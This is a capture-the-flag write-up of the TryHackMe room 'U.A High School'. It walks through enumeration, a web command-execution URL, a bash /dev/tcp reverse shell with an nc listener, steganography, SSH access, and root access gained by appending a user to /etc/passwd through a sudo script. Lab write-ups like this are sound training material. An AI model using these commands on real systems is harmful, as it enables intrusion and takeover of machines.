# Writeup for Room "U.A High School"

This is the writeup for the box U.A High School

## 🔍 Enumeration Phase

## 1. WebSite
- The website is running on Apache.
- No useful information was found in `robots.txt`.

    ![WebSite](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/u.a.-high-school/screenshots/00.png)

    ![robots.txt](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/u.a.-high-school/screenshots/01.png)

## 2. Fuzzing
-  **Dirbuster / Gobuster** was used to find directories and files, the following images show the results:

    ![Fuzzing](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/u.a.-high-school/screenshots/02.png)

> [!NOTE]
> There is a file named ```index.php``` in the ```/assets/``` directory, the content of the file was:

    ![index.php](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/u.a.-high-school/screenshots/03.png)

## 📡 3. Nmap Scan
- The following information was found:
  - The port 22 is open. **SSH**
  - The port 80 is open. **HTTP (Apache)**

    ![Nmap Scan](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/gotta-catch'em-all!/screenshots/04.png)

## 4. More Fuzzing 
- After performing a more extensive investigation, the software ```dirsearch``` allows us to use the command ```dirsearch -u http://<ip>/assets/index.php``` to find more directories and checks the urls for more information.

    ![dirsearch](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/u.a.-high-school/screenshots/05.png)

> [!NOTE]
> Dirsearch shows us a url where I can execute shell commands, the url is: ```http://<ip>/assets/index.php?cmd=whoami```

    ![cmd](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/u.a.-high-school/screenshots/06.png)

## 🌐🖥️ 5. WebSite - Reverse Shell
- I decided to execute a reverse shell by injecting the following command in the URL: ```bash+-c+'bash+-i+>%26+/dev/tcp/ip/4444+0>%261'```.

    ![command-01](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/u.a.-high-school/screenshots/07.png)

- Then, I set up a listener with: ```nc -nvlp 4444```.

    ![command-02](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/u.a.-high-school/screenshots/08.png)

- I started navigating backwards in the current directory and found a folder named Hidden_Content, which contains a file called passphrase.txt. Inside, there is a Base64-encoded string: ```QWxsbWlnaHRGb3JFdmVyISEhCg==```.

    ![passphrase.txt](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/u.a.-high-school/screenshots/09.png)

- The passphrase decoded is: ```AllmightForEver!!!```

    ![passphrase-2.txt](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/u.a.-high-school/screenshots/10.png)

- The home has the following directories : 

    ![home-directories](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/u.a.-high-school/screenshots/11.png)

- I have seen the first flag but I got permission denied when I try to access the file.

    ![first-flag](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/u.a.-high-school/screenshots/12.png)

- I to try to access by ssh with the user ```deku``` with the passphrase found before but without success.

    ![ssh-connection](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/u.a.-high-school/screenshots/13.png)

- I have found several images in the ```/var/www/html/assets/images/``` directory.

    ![images](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/u.a.-high-school/screenshots/14.png)

- I have downloaded the images :

    ![images-2](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/u.a.-high-school/screenshots/15.png)

## 🕵️‍♂️🖼️ 6. Steganography

- I have used file and binwalk to check if the image has hidden information.

    ![stegonography](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/u.a.-high-school/screenshots/16.png)

- I have used steghide with passphrase to extract the hidden information from the image but wihtout success.

    ![steghide](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/u.a.-high-school/screenshots/17.png)

- The ```oneforall.jpg```image is corrupted, I have changed the magic bytes to the following:

    ![magic-bytes](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/u.a.-high-school/screenshots/18.png)

- Now if I use steghide with the passphrase, I get new credentials.

    ![steghide-2](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/u.a.-high-school/screenshots/19.png)

    ![cred](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/u.a.-high-school/screenshots/20.png)

## 🔑 7. SSH Access

- I have used the credentials to connect to the machine:
  
    ![ssh-access](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/u.a.-high-school/screenshots/21.png)

- Here, I have gotten the first flag ```user.txt```

    ![user.txt](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/u.a.-high-school/screenshots/22.png)

## 🐚💻🚀 8. Privilege Escalation

- I have tried to use the command ```sudo -l``` to check the privileges of the user ```deku```:

    ![sudo-l](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/u.a.-high-school/screenshots/23.png)

- I am going to use ```linpeas.sh``` into the machine to check vulnerabilities.

    ![linpeas-1](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/u.a.-high-school/screenshots/24.png)

    ![linpeas-2](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/u.a.-high-school/screenshots/25.png)

- I have checked the exploit sections: 

    ![exploits](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/u.a.-high-school/screenshots/26.png)

- If I look the version of the software ```pkexec``` I get the following output:

    ![pkexec](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/u.a.-high-school/screenshots/27.png)

> [!NOTE]
> The website used to identify the vulnerability has been:
> https://www.exploit-db.com/exploits/50689
> I can use the following vulnerability to escalate privileges: https://ine.com/blog/exploiting-pwnkit-cve-20214034

- I try this but I was not successful, I tried with ```sudo -l``` and the credentials of the user ```deku``` and I got the following output:

    ![sudo-l-2](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/u.a.-high-school/screenshots/28.png)

- The content file is :

    ![content-file](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/u.a.-high-school/screenshots/29.png)

- The part about exploiting the feedback.sh file to escalate privileges was quite challenging for me, and without the help of writeups to understand what it does, I wouldn't have been able to achieve it, as I wouldn’t have reached the conclusion of creating a user.

- First, I create a password using the command ```mkpasswd -m md5crypt -s```

    ![mkpasswd](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/u.a.-high-school/screenshots/30.png)

- After creating the password, this password need be to formated in the following way:

    ![password-format](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/u.a.-high-school/screenshots/31.png)

- Second, I need to execute the feedback.sh file with the following command ```sudo /opt/NewComer/feedback.sh```

    ![feedback.sh](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/u.a.-high-school/screenshots/32.png)

- Now if I use the command ```tail -n1 /etc/passwd```, I can see the new user created.

    ![new-user](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/u.a.-high-school/screenshots/33.png)

- Finally, I can do a ```su MC``` with the password

    ![su-mc](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/u.a.-high-school/screenshots/34.png)

- I have gotten the second flag ```root.txt``` into the home directory of the user ```MC```

    ![root.txt](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/u.a.-high-school/screenshots/35.png)